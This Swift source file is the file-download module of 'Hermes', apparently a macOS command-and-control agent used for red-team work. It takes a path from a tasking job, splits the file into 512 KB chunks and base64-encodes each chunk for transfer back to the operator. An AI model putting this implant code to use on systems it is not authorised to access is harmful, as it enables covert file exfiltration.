//
//  download.swift
//  Hermes
//
//  Created by Justin Bui on 6/16/21.
//

import Foundation

func getFileID(job: Job) {
    do {
        let fileManager = FileManager.default
        var path = job.parameters
        
        // Strip out quotes if they exist, concept from Apfell agent
        if (path.prefix(1) == "\"") {
            path.removeFirst()
            path.removeLast()
        }
        
        // Check if ~ to base search from user home directory
        if (path.prefix(1) == "~") {
            path = NSString(string: path).expandingTildeInPath
        }
        
        var isDir : ObjCBool = false
        if fileManager.fileExists(atPath: path, isDirectory:&isDir) {
            if !isDir.boolValue {
                // isFile, get file size, determine number of chunks to send
                let attributes = try fileManager.attributesOfItem(atPath: path)
                let size = attributes[FileAttributeKey.size] as! Float
                let totalChunks = Int(ceil(size/512000))
                
                job.fileSize = Int(size)
                job.chunkNumber = 1
                job.totalChunks = totalChunks
                job.fullPath = path
                job.isScreenshot = false
                job.host = ""
                job.result = ""
            }
            else {
                // isDirectory
                job.result = "Cannot download a directory"
                job.completed = true
                job.success = false
                job.status = "error"
            }
        }
        else {
            job.result = "Could not download \(path), did you specify a full path or a file in your current directory?"
            job.completed = true
            job.success = false
            job.status = "error"
        }
    }
    catch {
        job.result = "Exception caught: \(error)"
        job.completed = true
        job.success = false
        job.status = "error"
    }
}

func downloadChunk(job: Job) {
    do {
        // Open file for reading
        let fileHandle = FileHandle(forReadingAtPath: job.fullPath)
        
        // This will start at 0, then go to 512000, and so on
        let offset = UInt64((job.chunkNumber - 1) * 512000)
        
        // Use seek to move to appropriate position within the file
        try fileHandle?.seek(toFileOffset: offset)
        
        // Read as much data as possible 512kb until the last chunk
        if job.chunkNumber < job.totalChunks {
            // Read data and convert to b64
            let data = (fileHandle?.readData(ofLength: 512000) ?? toData(string: " ")) as Data
            let b64Data = toBase64(data: data)
            
            job.chunkData = b64Data
        }
        // Last chunk read only the remaining data
        else if job.chunkNumber == job.totalChunks {
            // Read remainder data and convert to b64
            let length = job.fileSize - Int(offset)
            let data = (fileHandle?.readData(ofLength: length) ?? toData(string: " ")) as Data
            let b64Data = toBase64(data: data)
            
            job.chunkData = b64Data
            job.result = "Download complete"
            job.completed = true
            job.success = true
        }
    }
    catch {
        job.result = "Exception caught: \(error)"
        job.completed = true
        job.success = false
        job.status = "error"
    }
}